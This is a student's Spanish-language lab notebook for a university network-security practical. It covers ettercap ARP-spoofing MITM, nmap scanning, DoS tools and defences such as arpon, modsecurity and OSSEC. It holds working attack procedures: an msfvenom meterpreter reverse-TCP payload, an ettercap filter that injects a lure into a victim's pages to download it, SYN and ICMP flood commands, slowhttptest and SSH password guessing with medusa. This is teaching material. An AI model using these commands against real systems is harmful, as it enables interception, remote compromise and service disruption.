# LSI 2 : ELECTRICO BUGALLO

#### a) Instale el `ettercap` y pruebe sus opciones básicas en línea de comando.

```
apt install ettercap
```

- **Notas relevantes**
  - Especificar que usamos el modo texto ( -T creo)
  - Especificar targets: target 1  -> saliente, target2 -> entrante, formato: /ip1//  /ip2//.
  - **Cagadas**
    - No poner /// porque te cargas la red entera
    - No poner el gateway como target 1


#### b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el `wireshark` para los siguientes subapartados)

- Identifique los campos de cabecera de un paquete TCP

- Filtre la captura para obtener el tráfico HTTP

- Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)

  - Archivo -> Exportar Objetos -> HTTP -> Seleccionar una carpeta -> enjoy

- Visualice la paquetería TCP de una determinada sesión.

  - Filtrar tcp

- Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo
  como fuente de información para un análisis básico del tráfico.

  - Estadísticas -> Jerarquía protocolo

  - Estadísticas -> Protocolo concreto -> Contador de paquete

- Obtenga información del tráfico de las distintas “conversaciones”
  mantenidas.

  - Estadísticas -> Conversaciones

- Obtenga direcciones finales del tráfico de los distintos protocolos como
  mecanismo para determinar qué circula por nuestras redes.

  - Estadísticas -> Puntos finales



```shell
# Ejecutar en la maquina virtual
ettercap -Tq -P repoison_arp  -w salidaEttercap   -M   arp:remote /10.11.49.97// /10.11.48.1//

# Ejecutar en local para obtener el archivo a analizar con wireshark
scp lsi@10.11.49.98:/home/lsi/salidaEttercap /home/miguimartinezzz/Documentos  
```




#### c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.

```shell
nast -m
ettercap -Tq (pulsa L al terminar)
```


#### d) Obtenga la relación de las direcciones IPv6 de su segmento.

```shell
apt-get install thc-ipv6

atk6-alive6 ens33: muestra direcciones vivas en el segmento.
ettercap -Tq -6: muestra direcciones vivas en el segmento.
```

#### e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.
```shell
tcpdump -w archivo -i ens33
ettercap -Tqp -w archivo -i ens33
```

#### f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.

Cambiar en `/etc/ettercap/etter.conf`

```sh
ec_uid = 65534                # nobody is the default
ec_gid = 65534                # nobody is the default                                         ->ARP -A PARA COMRPOBAR SI FUNCIONA
# se cambia a 0 ambas esto da permisos de administrador

# remote_browser = "xdg-open http://%host%url"

# Descomentar las redircommand de linux
# Razon: Se fuma las claves publicas de https, en algunos navegadores salta aviso y te dice que hay un problema con los certificados
```

Defensa:

```shell
ettercap -Tq -M arp:remote -P remote_browser -P repoison_arp -w salidaEttercap -i ens33 /10.11.49.97// /10.11.48.1//
```

#### g) Instale `metasploit`. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.

- **Instalación**

```shell
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
msfdb init
msfconsole
```



- **Ejecutable reverse TCP**

```shell
# Dentro del msfconsole

/opt/metasploit-framework/bin/msfvenom -l payloads | grep "linux/x64"

msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=(IP_atacante) lport=1234 -f elf -o origen_shell
chmod +x origen_shell
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lhost (Ip atacante)
set lport 1234
exploit
# Cuando se ejecuta el ./origen_shells en el atacado se abre un nuevo shell, ejecuta
sysinfo
shell
lsof -i -P -n
```



- **Desplegando el meterpreter de metasploit con MITM y un filtro ettercap**

```shell
(creamos archivo , html.filter)
      if (ip.proto == TCP && tcp.dst == 80) {
	if (search(DATA.data, "Accept-Encoding")) {
		replace("Accept-Encoding", "Accept-Nothing!");
	}
	}
	if (ip.proto == TCP && tcp.src == 80) {
		if (search(DATA.data, "<title>")) {
			replace("</title>","</title><MUJER CALIENTE CERCA DE TI><h1>LINDA tiene ¡MUCHAS GANAS!
			de conocerte y ver todo de ti ;), te ha enviado un mensaje ,click aqui para abrirlo<h1><form method="get"
			action="http://10.11.49.98/evil_shell"><button type="submit">"DESCARGAR
			AHORA"</button></form>");
			msg("html injected");
		}
	}
(guardamos)
etterfilter html.filter -o html.ef
(instalamos apache)
apt install apache2
systemctl enable apache2
systemctl start apache2
mv evil_shell /var/www/html/
```



- **Defensa**

```shell
ettercap -i ens33 -Tq -P repoison_arp -p -F filter.ef -w salidaEttercap -M arp:remote /10.11.49.97// /10.11.48.1//
(abre w3m http://www.google.com la victima y deberia aparecer el html malicioso)
descargar el archivo y abrir el metaesploit para reventarle la maquina)
```

#### h) Haga un MITM en IPv6 y visualice la paquetería.

Hace un MITM :

```
atk6-parasite6 ens33
```

Crea trafico ICMP:

```shell
atk6-alive6 ens33
```

#### i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).

Arpon : proporciona un demonio que securiza el protocolo ARP. Maneja 3 algoritmos:

- **SARPI:** para redes configuradas estáticamente sin DHCP (utiliza una lista estática de
entradas y no permite cambios).
Arpon va a permitir actualizar o refrescar en la tabla arp las entradas estáticas que estén
especificadas en el fichero de configuración.
Permitirá añadir entradas dinámicas a la tabla arp si no están especificadas en el fichero de
configuración y permitirá limpiar todas las entradas sin atender al fichero de configuración.

- **DARPI:** para redes configuradas dinámicamente con DHCP (controla peticiones ARP
  entrantes y salientes, cachea las salientes y establece un timeout para las
  respuestas).
- **HARPI:** para redes configuradas estáticamente y dinámicamente (utiliza dos listas
  simultáneamente).



Añadir a `/etc/arpon`:

```sh
ip del compa
ip del roputer y macs
```



Defensa:

```shell
arpon -i ens33 -S    #Activarlo
kill all arpon       #Apagarlo porque peta con el paso del tiempo
```

-> si después de arpon no va el sniffing: 
   
   arp -d 10.11.48.1 (la mac se puso como direccion permanente, debemos borrarla para poder realizar sniffing).

#### j) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.



- Scanear rango :

  ```
  nmap -sn 10.11.48.1-15
  ```

- Host Discovery :

  ```
  nmap -sn 10.11.49.97
  ```

- Port Scanning:

  ```shell
  nmap -sV 10.11.49.97
  ```
- OS fingerprintin :

  ```shell
  nmap -O --osscan-guess -fuzzy 10.11.49.97
  ```
- Port scanning:

  ```shell
  nmap -sV -6 2002:0a0b:3161::1
  ```



#### k) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.

`iftop [-nNpP] [-i interfaz]`: escucha las conexiones en una determinada interfaz y
muestra el ancho de banda utilizado por dichas conexiones.

  iftop -i ens33
  
- n para que no mire el nombre de host de la conexión
- N para que no resuelva el puerto al nombre del servicio
-  p modo promiscuo (tráfico que no pase por la interfaz
  especificada tb se cuenta)
-  P para mostrar puertos.


`nethogs`: muestra el ancho de banda consumido por procesos individuales (a diferencia de iftop que muestra conexión de ip a ip etc.).

#### l) PARA PLANTEAR DE FORMA TEÓRICA: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?.

- **Direct attack:** Envío masivo de paquetes de manera directa a la víctima (la dirección origen es normalmente falsificada). Ejemplos: Ping of Dead, TCP SYN Flood….
- **Reflective flooding attack:** Se utilizan nodos intermedios como amplificadores (routers, servidores web, DNS …). El atacante envía paquetes que requieren respuesta a los amplificadores con ip origen la ip de la víctima ( los amplificadores responderán masivamente a la víctima). Ejemplos: SMURF, FRAGGLE…

###### Herramientas:
`packit:` Inyecta, manipula y monitoriza tráfico ip.
`hping3`: Añade funcionalidades a ping (spoofing, inyección de paquetes …) Direct attack: Inyectar muchos paquetes TCP por el puerto 22 (ssh) con el flag SYN activado,desde una ip aleatoria a la víctima.

```shell
packit -c 0 -b 0 -s 10.10.102.Y -d 10.10.102.X -F S -S 1000 -D 22
# -c : num total de paquetes a enviar (0 indica todos los que pueda).
# -b : num de paquetes a inyectar cada intervalo de tiempo (especificado por -w y por defecto
```

```shell
hping3 --rand-source -p 80 -S --flood 10.10.102.X
# --rand-source: direcciones ip aleatorias.
# -S : flag SYN activo.
# --flood : envía paquetes todo lo rápido que pueda.
```

- **Reflective flooding attack:** Inyectar paquetes ICMP-Echo Request con ip destino todas las redes de la LAN e ip origen la víctima. Todas las máquinas enviarán ICMP-Reply a la víctima.

```shell
packit -sR -d 10.10.102.233 -c 0 -b 0 -F S -S 80 -D 22 -sR # ip random.

hping3 --icmp 10.10.102.X --rand-dest --flood 10.10.102.X 10.10.102.X --rand-dest # X será un número aleatorio 0 - 255
```

#### m) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?

```shell
slowhttptest -c 1000 -g -X -o slow_http_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.49.97 -p 3
```

- `slowhttptest`
	- H Starts slowhttptest in SlowLoris mode, sending unfinished HTTP requests.
	- B Starts slowhttptest in Slow POST mode, sending unfinished HTTP message bodies.
	- X Starts slowhttptest in Slow Read mode, reading HTTP responses slowly
	- c 1000 -> Número de conexiones máximas
	- g -> Genera un Flow chart
	- X -> Activa slow_read_stats (Tipo de ataque, mantener el máximo de conexiones activas para joder bien al servidor)
	- o fichero -> Genera un html con los parámetros del test
	- r 200 -> Conexiones
	- w 512 -> Rango de bytes del Windows size
	- y -> Fin del rango de bytes del Windows size
	- n -> intervalos de segundos

###### Defensa

```shell
slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.49.97 -p 3
```


La victima se hace una petición HTTP a si misma  `wget http://10.11.49.97/`  o `wget http://127.0.0.1/`

#### n) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?

```shell
apt install libapache2-mod-security2
```

Modificar en `/etc/modsecurity/actimel.conf`:

```shell
SecConnEngine On

#Para ataques Slowloris
SecReadStateLimit 50

#Para ataques Slow http POST
SecWriteStateLimit 50
```

Modificar en `/etc/apache2/apache2.conf`:

```shell
Keepalive Off

# Keepalive si tarda en responder caga
# SecReadStateLimit limita peticiones por usuario
# SecwriteState lo mismo pero cndo esta en modo write )
```

 Es posible que si tienes el ossec te banee a cada DOS, desbanear y hacer otro tipo de ataque

```shell
a2enmod security2
a2dismod security2
```

#### o) Buscamos información.:

-  Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado
  a la Universidade da Coruña.

```shell
host udc.es
```

- Obtenga información sobre el direccionamiento de los servidores DNS y MX
  de la Universidade da Coruña.

```shell
dnsrecon -d udc.es
host -t MX udc.es

DNS: nslookup udc.es
MX: nslookup / set q= mx / udc.es
```

- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?.
  En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.

NO se puede hacer transferencia de zona

```shell
host -t AXFR sol.udc.es # Intenta realizar la transferencia de zona

dnsrecon -d udc.es -r 193.144.48.1-193.144.63.254 # Resolución de DNS inversa de cada un de las ip del rango para obtener los nombres de dominio
```

-  ¿Qué gestor de contenidos se utiliza en www.usc.es?

```shell
whatweb www.usc.es
# gestor: drupal
```

#### p) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.

- Host discovery:

```shell
nmap -sS 10.11.48.1-15
```
- Port Scannning:

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.11.48.1-15 -oG allPorts
```


- Lo hace todo y lo guarda en un archivo allPosts   

```shell
nmap -O --osscan-limit 10.11.49.93-100
```



#### q) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.

##### Ataque

- Atacante:

```shell
medusa -h 10.11.49.91 -u lsi -P passwords.txt -M ssh -f
```

- Victima

```shell
tail -f /var/log/auth.log | grep 'sshd'
```

##### Analizador de logs

```
apt install logcheck
```

Crear el archivo `/etc/logcheck/cracking.d/ssh` y añadirle la linea

```shell
^.*sshd.* # Regex que solo matchea con lineas del log que contengan la palabar ssh
```

Modificar en `/etc/cron.d/logcheck`

```shell
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=lsi@localhost

@reboot         logcheck    if [ -x /usr/sbin/logcheck ]; then nice -n10 /usr/sbin/logcheck -R; fi
0 8 * * *       logcheck    if [ -x /usr/sbin/logcheck ]; then nice -n10 /usr/sbin/logcheck; fi # Envia un correo todos los días a las 8 de la mañana

# EOF
```



Para leer los mail `mail --read` desde el usuario lsi

#### r) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.

##### Instalación

```shell
sudo apt -y install  wget git vim unzip make gcc build-essential php php-cli php-common libapache2-mod-php apache2-utils inotify-tools libpcre2-dev zlib1g-dev  libz-dev libssl-dev libevent-dev build-essential  libsystemd-dev
export VER="3.7.0" # Comprobar en la web si es la ultima version y cambiarla si es necesario
wget https://github.com/ossec/ossec-hids/archive/${VER}.tar.gz
tar -xvzf ${VER}.tar.gz
cd ossec-hids-${VER}
sudo sh install.sh # Instalar modo local y darle enter a todo menos al correo electronico (lsi@localhost)
```

##### Funcionamiento

```shell
/var/ossec/bin/ossec-control start # Encender el servicio
/var/ossec/bin/ossec-control stop # Apagar el servicio
```

##### Defensa

- Comprobar si el ataque a sido parado:

```shell
cat /etc/host.deny
iptables -L
```
- Desbanear

```shell
/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.48.X
/var/ossec/active-response/bin/host-deny.sh delete - 10.11.48.X
/var/ossec/bin/ossec-control restart
```

#### s) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.

```shell
# Muestra las distintas alertas generadas a partir del log
cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a

# Muestra un resumen de las alertas
cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a | /var/ossec/bin/ossec-reportd
```
